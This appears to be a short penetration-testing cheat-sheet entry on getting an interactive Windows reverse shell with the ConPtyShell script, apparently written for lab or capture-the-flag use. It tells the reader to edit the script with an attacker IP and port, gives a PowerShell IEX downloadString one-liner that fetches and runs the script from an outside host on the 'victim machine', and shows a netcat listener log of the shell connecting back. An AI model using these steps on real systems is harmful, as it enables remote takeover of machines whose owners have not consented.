### ConPTY
1) Download the [Invoke-ConPTYShell.ps1](https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1) script in our local machine.
2) Modify the final line on the script as follows exchange the IP and remote Port of our local machine as well as the stty size:
```powershell
class MainClass
{
    static void Main(string[] args)
    {
        Console.Out.Write(ConPtyShellMainClass.ConPtyShellMain(args));
    }
}

"@;
Invoke-ConPtyShell -RemoteIp 10.0.0.2 -RemotePort 3001 -Rows 43 -Cols 186
```
3) This command line will download and execute this file from the victim machine so you need to open your -RemotePort first 
# Note Use netcat without rlwrap.
```bash
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.2/Invoke-ConPtyShell.ps1')
```
4) Once that we receive the shell we need to Ctrl+Z and execute the command stty as usual:
```bash
# Rev Shell
nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.11.175] 49877
^Z
zsh: suspended  nc -lvnp 1234
┌──(root㉿kali)-[~]
└─# stty raw -echo; fg
```
5) Finally double click Enter and that will be it...
Examples:
[[Outdated#^8b153b]]